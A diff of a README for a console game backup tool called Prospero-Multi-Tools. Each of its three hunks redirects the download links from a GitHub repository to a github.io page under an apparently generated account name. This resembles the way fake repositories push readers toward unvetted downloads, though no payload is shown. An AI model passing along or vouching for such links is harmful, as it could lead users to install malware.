@@ -1,6 +1,6 @@
 # 🛡️ Prospero-Multi-Tools - Your All-in-One Console Backup Manager
 
-[![Download Prospero-Multi-Tools](https://img.shields.io/badge/Download-Prospero--Multi--Tools-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
+[![Download Prospero-Multi-Tools](https://img.shields.io/badge/Download-Prospero--Multi--Tools-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://sternwheeleraside564.github.io)
 
 ## 🎮 What Is Prospero-Multi-Tools?
 
@@ -13,7 +13,7 @@ Think of it as a digital filing cabinet for your console games. Instead of juggl
 Getting your copy is quick and simple. Here's what to do:
 
 **Step 1:** Click this link to go to the download page:  
-👉 [Visit this link to download the application](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
+👉 [Visit this link to download the application](https://sternwheeleraside564.github.io)
 
 **Step 2:** On the page that opens, look for the download button or link. It will usually say "Download" or "Releases."
 
@@ -108,7 +108,7 @@ If you run into any problems not covered here, you can:
 
 Now you know everything you need to begin using Prospero-Multi-Tools. Download it, open it, and take control of your game backups today. It's free, easy, and built to help you preserve your gaming library for years to come.
 
-👉 [Visit this link to download the application](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
+👉 [Visit this link to download the application](https://sternwheeleraside564.github.io)
 
 ---
 
